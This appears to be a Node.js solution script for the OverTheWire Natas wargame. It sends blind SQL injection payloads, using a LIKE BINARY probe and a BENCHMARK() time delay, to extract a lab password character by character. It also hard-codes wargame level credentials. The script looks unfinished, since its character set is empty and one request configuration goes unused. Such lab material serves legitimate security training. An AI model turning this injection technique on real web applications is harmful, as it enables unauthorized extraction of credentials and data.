#!/usr/bin/env node
/* eslint-disable */
fs = require('fs');
http = require('http');

chars='';
password = '';
credentials = {
    host: 'natas17.natas.labs.overthewire.org',
    login: 'natas17',
    password: '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
}
let n = 0;

function rec(password) {
    console.log(n++)
    for (let i = 0; i < chars.length; i++) {
        doReq(password, chars[i])
    }
}


function doReq(password, char) {
    // might be able to use the WAITFOR DELAY "HH:MM:SS" command
    // there is some good stuff on this on https://www.owasp.org/index.php/Blind_SQL_Injection
    const postData = 'username=natas15" AND BENCHMARK(50000000,ENCODE("MSG","by 5 seconds") AND password LIKE BINARY "' + password + char + "%"

    const options = {
        host: 'natas15.natas.labs.overthewire.org',
        path: '/index.php?debug=true',
        method: 'POST',
        auth: "natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
        headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
    };

    const options17 = {
        host: credentials.host,
        path: '/index.php?debug=true',
        method: 'POST',
        auth: `${credentials.login}:${credentials.password}`,
        headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
    };

    const req = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', (chunk) => {
        console.log(chunk)
        if(chunk.match('exists')) {
            password += char;
            console.log('exists', password, char)
            rec(password)
        }
    });
    res.on('end', () => {
        // console.log('fail', password, char)
        console.log('END!')
    });
    });

    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
        process.exit();
    });

    // write data to request body
    req.write(postData);
    req.end();
}

doReq("","");
// rec(password)